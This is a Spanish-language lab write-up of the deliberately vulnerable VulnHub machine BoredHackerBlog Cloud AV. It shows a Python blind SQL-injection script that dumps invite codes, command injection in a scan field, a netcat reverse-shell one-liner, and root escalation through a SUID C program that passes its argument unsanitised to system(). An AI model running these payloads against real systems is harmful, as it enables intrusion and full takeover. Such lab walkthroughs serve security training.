---
layout: single
title: BoredHackerBlog Cloud AV - VulnHub
excerpt: "La maquina BoredHackerBlog Cloud AV esta catalogada como facil es una maquina linux donde tendremos que explotar una SQLite Boolean Blind Based Injection para poder obtener los codigos de invitacion para poder acceder ala maquina para la escalada de privilegios tendremos que abusar de un binario que es SUID para convertirnos en el usario root"
date: 2023-02-21
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-BoredHB/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - infosec
  - Spanish
tags:  
  - SQLI
  - SUID
---
![](/assets/images/vh-writeup-BoredHB/logo.png)

En esta ocasion la maquina no tiene flags 

## Reconocimiento

```bash
❯ whichSystem.py 192.168.100.90

192.168.100.90 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,8080 192.168.100.90 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 19:36 CST
Nmap scan report for 192.168.100.90
Host is up (0.00027s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a424b7c2a060f504b32cfb831e9c4f4 (RSA)
|   256 81c7600fd71e56f7a31e9f7627bd3127 (ECDSA)
|_  256 7190c326ba3be8b3537e7353274d6baf (ED25519)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 00:0C:29:A3:02:B7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds
```

## Enumeracion

```bash
❯ whatweb http://192.168.100.90:8080
http://192.168.100.90:8080 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.14.1 Python/2.7.15rc1], IP[192.168.1.90], Python[2.7.15rc1], Werkzeug[0.14.1]
```

La version del `ssh` es muy viejo asi que podemos usar un script para enumerar posibles usuarios y contraseñas de los mismos de la maquina pero en esta ocasion no estare usando el script

```bash
❯ searchsploit ssh user enumeration
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                          | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                          | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                         | linux/remote/40113.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Asi es como se ve la pagina web

![](/assets/images/vh-writeup-BoredHB/Web1.png)

Y bueno vemos que nos pide un codigo de invitacion pero no tenemos ninguno podemos probar inventando algunos como `KYUGS55` o nose por que tampoco no sabemos la longitud de los mismo asi que lo que podemos hacer pues es probar

Bueno si no es correcto el codigo introducido la web te dice esto

![](/assets/images/vh-writeup-BoredHB/Web2.png)

Tambien no sabemos si el codigo de invitacion necesite de caracteres especiales 

Vamos a interceptar con `burpsuite` para ver a donde se esta enviando la peticion

```bash
❯ burpsuite > /dev/null 2>&1 & disown
```

Vemos que esta haciendo una peticion por `POST` que viaja a `/login` 

![](/assets/images/vh-writeup-BoredHB/burp1.png)

Ahora vamos a hacer fuzzing para que en `password` pruebe caracteres especiales con un diccionario de `Seclist`

```bash
❯ locate special-chars
/usr/share/SecLists/Fuzzing/special-chars.txt
```

```bash
❯ wfuzz -c -w /usr/share/SecLists/Fuzzing/special-chars.txt -d 'password=FUZZ' http://192.168.100.90:8080/login
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.90:8080/login
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000001:   200        0 L      2 W        17 Ch       "~"                                                            
000000012:   200        0 L      2 W        17 Ch       "-"                                                            
000000003:   200        0 L      2 W        17 Ch       "@"                                                            
000000006:   200        0 L      2 W        17 Ch       "%"                                                            
000000008:   200        0 L      2 W        17 Ch       "&"                                                            
000000011:   200        0 L      2 W        17 Ch       ")"                                                            
000000007:   200        0 L      2 W        17 Ch       "^"                                                            
000000009:   200        0 L      2 W        17 Ch       "*"                                                            
000000010:   200        0 L      2 W        17 Ch       "("                                                            
000000005:   200        0 L      2 W        17 Ch       "$"                                                            
000000013:   200        0 L      2 W        17 Ch       "_"                                                            
000000002:   200        0 L      2 W        17 Ch       "!"                                                            
000000004:   200        0 L      2 W        17 Ch       "#"                                                            
000000014:   200        0 L      2 W        17 Ch       "+"                                                            
000000031:   200        0 L      2 W        17 Ch       "<"                                                            
000000016:   200        0 L      2 W        17 Ch       "{"                                                            
000000027:   200        0 L      2 W        17 Ch       ";"                                                            
000000028:   200        0 L      2 W        17 Ch       ":"                                                            
000000029:   200        0 L      2 W        17 Ch       "'"                                                            
000000020:   200        0 L      2 W        17 Ch       "|"                                                            
000000032:   200        0 L      2 W        17 Ch       ">"                                                            
000000019:   200        0 L      2 W        17 Ch       "["                                                            
000000024:   200        0 L      2 W        17 Ch       "."                                                            
000000025:   200        0 L      2 W        17 Ch       "/"                                                            
000000015:   200        0 L      2 W        17 Ch       "="                                                            
000000022:   200        0 L      2 W        17 Ch       "`"                                                            
000000023:   200        0 L      2 W        17 Ch       ","                                                            
000000026:   200        0 L      2 W        17 Ch       "?"                                                            
000000017:   200        0 L      2 W        17 Ch       "}"                                                            
000000018:   200        0 L      2 W        17 Ch       "]"                                                            
000000030:   500        272 L    1353 W     17612 Ch    """                                                            
```

Vemos que pasa nos da una respueta diferente cuando ponemos `"""` las doble comillas asi que vamos a ver que pasa en la web

![](/assets/images/vh-writeup-BoredHB/Web3.png)

al poner las doble comillas y darle al enter me da error y nos muestra informacion de `mysql` al igual que podemos ver la ruta esta montado el proyecto y una ruta en la cual ya nos esta dando un usuario `scanner`

Ademas por detras esta haciendo una `query`

```mysql
if len(c.execute('select * from code where password="' + password + '"').fetchall()) > 0:

```

Con esto sabemos que el codigo que estamos indicando es la contraseña

Vamos a interceptar la peticion con `burpsuite` otra vez esta `url-encodeado` has un `ctrl+shift+u` para `decodearlo`

![](/assets/images/vh-writeup-BoredHB/burp2.png)

Y asi te la muestra con el caracter que pusiste en el login

![](/assets/images/vh-writeup-BoredHB/burp3.png)

Vamos a emitir esta peticion al `repiter` con `ctrl+r` para hay hacer pruebas

Si le damos a `send` vemos el error `500`

![](/assets/images/vh-writeup-BoredHB/burp4.png)

Despues de probar vemos que solo hay `1` columna por que me da una respuesta diferente ahora es `200` cuando es correcta ademas si poner por ejemplo `" order by 100-- -` que esta mal en la respuesta te da un `OperationalError: 1st ORDER BY term out of range - should be between 1 and 1 // Werkzeug Debugger` 

![](/assets/images/vh-writeup-BoredHB/burp5.png)

Ahora si hacemos un `" union select 1-- -` nos esta redirigiendo a `/scan`

Bueno para poder ver lo que hay en la ruta `/scan` tenemos que aplicar la inyeccion en el campo donde nos pide el codigo si lo hacemos no muestra esto pero bueno nosotros vamos a hacer toda la inyeccion sql para averiguar el codigo de invitacion

![](/assets/images/vh-writeup-BoredHB/Web4.png)

Bueno vamos a proceder en el error `sql` de la web al principio nos estaba dando la tabla `code` y algo a decir es que cuando algo es valido nos muestra un `200 OK` no estamos viendo nada del lado de la web asi la inyeccion va a hacer de tipo `Boolean`

![](/assets/images/vh-writeup-BoredHB/burp6.png)

Bueno ahora necesitamos saber cuales de los caraceteres son correctos si testeamos cuando pongo el caracter `m` la respuesta cambia asi que sabemos que el primer caracter es `m` pero podemos automatizar la inyeccion con un script de `python3`

![](/assets/images/vh-writeup-BoredHB/burp7.png)

Esta es el script hecho por el gran maestro s4vitar <https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q>

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, time, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.100.90:8080/login"
characters = string.ascii_lowercase + string.digits + ","

def makeSQLI():
    
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando")

    time.sleep(2)
    p2 = log.progress("Datos extraidos")
    
    extracted_info = ""

    for position in range(1, 100):
        for character in characters:

            post_data = {
                'password': '''" or (select substr(group_concat(password),%d,1) from code)='%s'-- -''' % (position,character)
            }
            
            r = requests.post(main_url, data=post_data)

            if "WRONG INFORMATION" not in r.text:
                extracted_info += character
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()            
```

Estos son los codigos finales

```bash
❯ python3 exploit.py
[0] Fuerza Bruta: Iniciando
[....\...] Datos extraidos: myinvitecode123,mysecondinvitecode,cloudavtech,mostsecurescanner


[!] Saliendo...
```

Ahora si probamos poner un codigo en la web nos funciona si no te funciona un codigo prueba con el siguiente y asi sucesivamente

![](/assets/images/vh-writeup-BoredHB/Web5.png)

En la web nos dice que podemos tratar de escanear algunos archivos asi que vamos a probar con el primero `bash`

![](/assets/images/vh-writeup-BoredHB/Web6.png)

Vamos a tratar de concatenar un comando `bash; id` y funciona por que el codigo no esta sanitizado

![](/assets/images/vh-writeup-BoredHB/Web7.png)

## Ganando acceso al sistema

Vamos a enviarnos una reverse shell con `netcat` pones el oneliner despues del `bash; ` y le das al boton de `Scan` para que te envie la shell <https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Nos ponemos en escucha por el puerto que indicaste

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Y recibimos la shell

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.15] from (UNKNOWN) [192.168.100.90] 49356
/bin/sh: 0: can't access tty; job control turned off
$ whoami
scanner
$ id
uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)
$ 
```

para que tengas una mejor consola has esto

```bash
script /dev/null -c bash
stty raw -echo; fg
reset xter
ENTER
export TERM=xterm
export SHELL=/bin/bash
```

## Escalada de privilegios

Tenemos un archivo `SUID`

```bash
scanner@cloudav:~$ ls
cloudav_app  update_cloudav  update_cloudav.c
scanner@cloudav:~$ ls -l update_cloudav
-rwsr-xr-x 1 root scanner 8576 Oct 24  2018 update_cloudav
scanner@cloudav:~$ file update_cloudav
update_cloudav: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85920076615efed0c3b83a74aa1ac85ab72fb12f, not stripped
scanner@cloudav:~$ 
```

Si ejecutamos el script hace esto

```bash
scanner@cloudav:~$ ./update_cloudav 
This tool lets you update antivirus rules
Please supply command line arguments for freshclam
scanner@cloudav:~$ 
```

Este es el codigo del programa 

```c
scanner@cloudav:~$ cat update_cloudav.c 
#include <stdio.h>

int main(int argc, char *argv[])
{
char *freshclam="/usr/bin/freshclam";

if (argc < 2){
printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);
return 0;
}
```

Tienes que pasarle un argumento al programa, si logramos inyectar un comando lo ejecutaremos como `root` por que esta asignando el setuid a 0

Vamos a hacer una prueba y lo ejecuta como `root`

```bash
scanner@cloudav:~$ ./update_cloudav 'xdd; whoami'
ERROR: /var/log/clamav/freshclam.log is locked by another process
ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).
root
scanner@cloudav:~$ 
```

Como no hay sanitizacion del codigo y nos pide un argumento al ejecutar `freshclam` ya que en el codigo esta poniendo la ruta absoluta y podemos concatenar un comando vamos a convertirnos como el usuario root por que le estamos diciendo que `'xdd; bash'` es un argumento

```bash
scanner@cloudav:~$ ./update_cloudav 'xdd; bash'
ERROR: /var/log/clamav/freshclam.log is locked by another process
ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).
root@cloudav:~# whoami
root
root@cloudav:~# id
uid=0(root) gid=0(root) groups=0(root),1001(scanner)
root@cloudav:~# 
```






























































































